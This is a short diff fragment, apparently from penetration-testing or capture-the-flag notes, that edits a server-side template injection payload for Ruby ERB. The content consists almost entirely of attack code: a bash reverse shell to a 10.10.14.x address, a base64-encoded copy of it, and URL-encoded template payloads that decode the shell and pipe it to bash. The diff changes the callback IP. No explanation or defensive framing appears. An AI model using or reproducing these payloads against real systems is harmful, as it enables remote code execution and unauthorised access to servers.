@@ -13,7 +13,8 @@ base64 <<< "bash -i >& /dev/tcp/10.10.14.59/11234 0>&1" | sed 's/\+/\%2b/'
 
 test <%=system("echo+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%>
 
-test%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%25>
+test%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC40NC8xMTIzNCAwPiYxCg==
++|+base64+-d+|+bash");%25>
 ```
 
 ``` 
